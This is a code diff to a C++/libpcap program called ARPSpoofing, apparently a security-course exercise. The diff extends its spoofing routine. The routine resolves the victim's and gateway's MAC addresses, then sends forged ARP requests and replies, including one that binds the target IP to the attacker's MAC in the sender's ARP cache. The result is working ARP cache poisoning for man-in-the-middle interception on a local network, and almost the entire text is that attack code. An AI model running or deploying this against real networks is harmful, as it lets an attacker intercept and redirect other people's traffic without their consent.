@@ -25,7 +25,7 @@ struct MyAddr final{
 
 void usage() {
     printf("syntax: ARPSpoofing <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
-    printf("sample: ARPSpoofing eth0 192.168.0.2 192.168.0.3\n");
+    printf("sample: ARPSpoofing eth0 192.168.0.4 192.168.0.1\n");
 }
 
 MyAddr getAttackerAddr(char *dev);
@@ -148,10 +148,7 @@ Mac getMACAddr(pcap_t* handle, Ip IP)
 
         int res = pcap_next_ex(handle, &hdr, &packet);
 
-        if(res==0)
-        {
-            continue;
-        }
+        if(res==0)   continue;
 
         if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
         {
@@ -161,31 +158,38 @@ Mac getMACAddr(pcap_t* handle, Ip IP)
 
         struct EthArpPacket* etharp = (EthArpPacket *)packet;
 
-        if(etharp->eth_.type() == EthHdr::Arp  && etharp->arp_.op()==ArpHdr::Reply && etharp->arp_.sip()== IP)
+        if(etharp->eth_.type() == EthHdr::Arp && etharp->arp_.op()==ArpHdr::Reply && etharp->arp_.sip()== IP)
         {
             return etharp->arp_.smac();
-        }
-        else
-        {
-            printf("wrong packet\n");
-            printf("%d\n",ntohs(etharp->eth_.type_));
-            printf("%d\n",ntohs(etharp->arp_.op_));
-            printf("Ip(myip) : %s\n\n",std::string(etharp->arp_.sip()).c_str());
         }
     }
 }
 
 void arpSpoofing(pcap_t* handle, char* sendIP, char* targetIP, MyAddr attacker)
 {
-
-    printf("arpSpoofing\n");
-
     Ip sIP = Ip(sendIP);
     Ip tIP = Ip(targetIP);
+    Ip rIP;
+
+    //0. get MAC addr
+    sendARPRequest(handle,attacker.mac_,Mac::broadcastMac(),attacker.mac_,attacker.ip_,Mac::nullMac(),tIP);
+    Mac tMAC = getMACAddr(handle, tIP);
+    printf("tmac : %s\n",std::string(tMAC).c_str());
     sendARPRequest(handle,attacker.mac_,Mac::broadcastMac(),attacker.mac_,attacker.ip_,Mac::nullMac(),sIP);
     Mac sMAC = getMACAddr(handle, sIP);
     printf("smac : %s\n",std::string(sMAC).c_str());
-    sendARPReply(handle, sMAC, attacker.mac_,attacker.mac_,tIP,sMAC,sIP);
+
+    //1. sender PC request
+    sendARPRequest(handle, sMAC,Mac::broadcastMac(),sMAC,sIP,Mac::nullMac(),tIP);
+
+    //2. target PC reply
+    sendARPReply(handle,tMAC,sMAC,tMAC,tIP,sMAC,sIP);
+
+    //3. attacker PC reply
+    sendARPReply(handle,attacker.mac_,sMAC,attacker.mac_,tIP,sMAC,sIP);
+
+    //4. attacker PC request
+    sendARPRequest(handle,attacker.mac_,sMAC,attacker.mac_,tIP,Mac::nullMac(),rIP);
 
 }
 
